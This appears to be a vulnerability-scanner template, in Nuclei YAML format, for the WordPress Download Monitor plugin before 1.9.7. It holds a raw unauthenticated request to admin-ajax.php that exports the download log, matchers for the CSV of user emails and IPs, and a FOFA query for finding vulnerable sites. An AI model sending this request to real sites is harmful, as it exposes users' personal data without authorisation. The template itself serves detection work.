http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(header, 'attachment; filename=download_log.csv')
    - contains_all(body, 'Download ID', 'User Email', 'User IP')
    type: dsl
  raw:
  - 'GET /wp-admin/admin-ajax.php?action=test&dlm_download_logs=true HTTP/1.1

    Host: {{Hostname}}

    '
id: download-monitor-unauth-log-export
info:
  author: 0x_Akoko
  description: 'Detected Download Monitor plugin before 1.9.7 exposed the full download
    log CSV to unauthenticated users, revealing fields including User Login, User
    Email, User IP, and User Agent for every recorded download.

    '
  metadata:
    fofa-query: app="WordPress" && body="download-monitor"
    max-request: 1
    verified: true
  name: Download Monitor < 1.9.7 - Unauthenticated Download Log Export
  reference:
  - https://github.com/download-monitor/download-monitor/commit/72d76b34a372101f0f68e904c1665f688797b662
  - https://wordpress.org/plugins/download-monitor/
  severity: high
  tags: disclosure,download-monitor,exposure,unauth,wordpress,wp-plugin
